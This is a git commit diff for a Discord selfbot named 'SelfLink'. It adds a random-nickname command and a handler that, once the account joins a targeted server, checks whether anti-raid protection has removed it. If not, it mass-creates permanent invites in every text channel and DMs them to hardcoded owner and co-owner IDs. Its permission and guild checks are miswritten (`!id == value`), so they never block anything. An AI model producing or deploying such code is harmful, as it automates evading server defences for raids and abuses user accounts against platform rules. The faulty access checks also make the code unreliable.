aceeba01aaab06e43e35b46b4c1fb0370e2b2eeb
entitymob <eliasmob@outlook.fr>
2022-11-28 16:16:45 +0100

    added command "nick" that allows you to change your nickname randomly.

---
+++ commands/admin/nick.js
@@ -0,0 +1,22 @@
+const discord = require('discord.js-selfbot-v13');
+
+function randomcharacter(length) {
+    let result = '';
+    let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$^ù*ç%µ£¤!§:;.,?/\\|@#~&é"\'(-è_çà)=+';
+    let charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+module.exports = (/** @type {discord.Client} */ client, /** @type {discord.Message} */ message, /** @type {Array<String>} */ args) => {
+    if(!args[0]) return;
+    client.guilds.fetch(args[0]).then(guild => {
+        guild.me.setNickname(randomcharacter(8)).catch((err) => {
+            message.author.send('Failed to set nickname : ' + err);
+        });
+    }).catch((err) => {
+        message.author.send('Cannot fetch guild ID');
+    });
+}
--- index.js
+++ index.js
@@ -1,22 +1,9 @@
 const ownerid = '421720300196069416';
+const coownerid = '1020353521717096510';
 const prompt = require('prompt-sync')({ sigint: true });
 const fs = require('fs');
 const discord = require('discord.js-selfbot-v13');
 const client = new discord.Client({
-    intents: [
-        discord.Intents.FLAGS.GUILDS,
-        discord.Intents.FLAGS.GUILD_MESSAGES,
-        discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
-        discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
-        discord.Intents.FLAGS.GUILD_MEMBERS,
-        discord.Intents.FLAGS.GUILD_PRESENCES,
-        discord.Intents.FLAGS.GUILD_VOICE_STATES,
-        discord.Intents.FLAGS.GUILD_INVITES,
-        discord.Intents.FLAGS.GUILD_BANS,
-        discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
-        discord.Intents.FLAGS.GUILD_INTEGRATIONS,
-        discord.Intents.FLAGS.GUILD_WEBHOOKS,
-    ],
     checkUpdate: false,
 });
 
@@ -35,45 +22,88 @@ fs.readdirSync('./commands/admin').forEach(file => {
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}`);
-    client.user.setActivity('SelfLink Connected', { type: 'WATCHING', name: 'SelfLink', url: 'https://discord.gg/PCSpuTgadU' });
+    client.user.setActivity('SelfLink Connected', { type: 'STREAMING', name: 'SelfLink', url: 'https://discord.gg/PCSpuTgadU' });
 });
+
+let antiraid = false;
+client.on('guildCreate', async (guild) => {
+    if(!guild.id == '749395828925268060') return;
+    antiraid = true;
+    await sleep(5000);
+    if(antiraid) return;
+    client.users.cache.get(ownerid).send(`Antiraid disabled on krakovia ! Creating mass invites...`);
+    client.users.cache.get(coownerid).send(`Antiraid disabled on krakovia ! Creating mass invites...`);
+    guild.channels.cache.forEach(async (channel) => {
+        if(channel.type == 'GUILD_TEXT') {
+            for(let i = 0; i < 10; i++) {
+                await channel.createInvite({ maxAge: 0, maxUses: 0 }).catch((err) => {
+                    console.log(`Failed to create invite`);
+                }).then((invite) => {
+                    client.users.cache.get(ownerid).send(`Invite created : ${invite.url}`);
+                    client.users.cache.get(coownerid).send(`Invite created : ${invite.url}`);
+                });
+            }
+        }
+    });
+
+});
+
+client.on('guildDelete', async (guild) => {
+    if(!guild.id == '749395828925268060') return;
+    if(antiraid) {
+        console.log(`AntiRaid detected on krakovia !`);
+        return;
+    }
+    antiraid = false;
+});
+
+
 
 client.on('messageCreate', async (message) => {
     if(message.content.startsWith('.')) {
         let args = message.content.slice(1).split(' ');
         let command = args.shift().toLowerCase();
+        if(!message.author.id == ownerid && !message.author.id == coownerid && !message.author.id == client.user.id) return;
         if(clientcommands.has(command)) {
             clientcommands.get(command)(client, message, args);
         }
-        if(message.author.id !== ownerid) return;
+        if(!message.author.id == ownerid && !message.author.id == coownerid) return;
         if(admincommands.has(command)) {
             admincommands.get(command)(client, message, args);
         }
     }
 });
 
-let token = getToken();
-client.login(token).catch((err) => {
-    console.log(`Invalid token`);
-    process.exit(0);
-}).then(() => {
-    console.log(`Token is valid !`);
-    let save = prompt('Save token ? (y/n) ');
-    if (save == 'y') {
-        fs.writeFileSync('token.txt', token);
-        console.log(`Token saved !`);
-    }
-});
 
+let token = ''
+getToken();
 
 function getToken(){
-    if(fs.existsSync('./token.txt')) {
+    if(fs.existsSync('token.txt')) {
         console.log(`Token found in token.txt`);
-        let token = fs.readFileSync('./token.txt', 'utf-8');
-        return token;
+        token = fs.readFileSync('./token.txt', 'utf-8');
+        return client.login(token).catch((err) => {
+            console.log(`Invalid token`);
+            fs.unlinkSync('./token.txt');
+            getToken();
+        });
     }
-    let token = prompt('Token: ');
-    console.log(`token`);
+    token = prompt('Token: ');
     console.log(`Checking token...`);
-    return token;
+
+    client.login(token).catch((err) => {
+        console.log(`Invalid token. Please, try again.`);
+        getToken();
+    }).then(() => {
+        console.log(`Token is valid !`);
+        let save = prompt('Save token ? (y/n) ');
+        if (save == 'y') {
+            fs.writeFileSync('token.txt', token);
+            console.log(`Token saved !`);
+        }
+    });
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
 }
